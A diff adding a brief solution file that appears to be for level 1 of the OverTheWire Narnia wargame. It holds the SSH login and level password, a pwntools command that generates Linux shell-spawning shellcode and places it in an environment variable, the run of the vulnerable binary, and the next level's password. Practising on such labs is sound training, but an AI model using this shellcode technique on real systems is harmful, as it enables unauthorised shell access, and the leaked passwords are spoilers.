@@ -1,0 +1,11 @@
+ssh narnia1@narnia.labs.overthewire.org -p 2226
+
+efeidiedae
+
+cd /narnia
+
+export EGG=$(python -c "import pwn; print(pwn.asm(pwn.shellcraft.linux.sh()))")
+
+./narnia1
+
+#password is nairiepecu
